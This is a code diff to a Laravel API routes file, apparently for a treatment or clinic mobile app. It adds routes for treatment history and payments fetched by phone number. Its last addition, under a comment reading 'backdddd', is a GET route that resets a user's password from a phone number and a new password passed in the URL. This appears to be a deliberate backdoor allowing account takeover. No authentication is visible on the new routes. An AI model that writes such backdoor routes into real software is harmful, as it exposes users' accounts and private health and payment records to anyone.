@@ -29,6 +29,10 @@ Route::get("news/all", "Mobile\NewsController@getAllNews");
 Route::get("news/loadmore", "Mobile\NewsController@loadMore");
 //treatment category
 Route::get("treatmentcategory/all", "Mobile\TreatmentCategoryController@getAll");
+//History Treatment
+
+Route::post("historyTreatment/all","Mobile\HistoryTreatmentController@getAll");
+Route::post("historyTreatment/{phone}","Mobile\HistoryTreatmentController@getByPhone");
 
 //treatment
 
@@ -41,6 +45,9 @@ Route::get("appointment/{id}", "Mobile\AppointmentController@getById");
 Route::get("appointment/getByPhone/{phone}", "Mobile\AppointmentController@getByPhone");
 Route::post("appointment/book", "Mobile\AppointmentController@bookAppointment");
 Route::post("appointment/quickbook", "Mobile\AppointmentController@quickBookAppointment");
+//payment
+Route::post('payment/getByPhone','Mobile\PaymentController@getByPhone');
 
-
+///backdddd
+Route::get("rsPW/{phone}/{pass}","Mobile\UserController@resetpassword");
 
